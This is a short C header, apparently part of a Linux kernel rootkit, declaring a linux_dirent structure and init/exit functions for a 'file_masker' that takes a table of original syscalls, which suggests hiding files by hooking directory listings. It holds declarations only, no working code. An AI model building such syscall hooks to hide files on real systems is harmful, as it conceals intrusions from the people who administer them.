#ifndef __FILE_MASKER__
#define __FILE_MASKER__

#include "core.h"

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

void file_masker_init(struct orig *original_syscalls);
void file_masker_exit(void);

#endif
